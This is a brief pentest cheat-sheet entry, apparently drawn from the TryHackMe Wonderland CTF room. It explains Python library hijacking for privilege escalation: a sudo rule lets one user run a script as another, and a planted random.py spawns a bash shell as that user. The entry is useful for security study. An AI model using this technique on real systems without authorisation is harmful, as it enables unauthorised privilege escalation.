#### Libraries hijacking
If there is a script using certain library without full path, you can hijack and impersonate commands as the user executing the script:

```python
alice@wonderland:/root$ sudo -l
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

In this case the random library can be hijacked:
```python
--------------------- Code being executed -------------------------------
import random
poem = """The sun was shining on the sea,
Shining with all his might"""
```
The prior library is not using full path to being called so we can create a file called random.py as python will first look onto the same folder instead of the PATH variable environment:
```python
--------------------------- random.py ---------------------------------
import pty

pty.spawn("/bin/bash")
```
Examples: 
[THM Wonderland](https://tryhackme.com/room/wonderland)
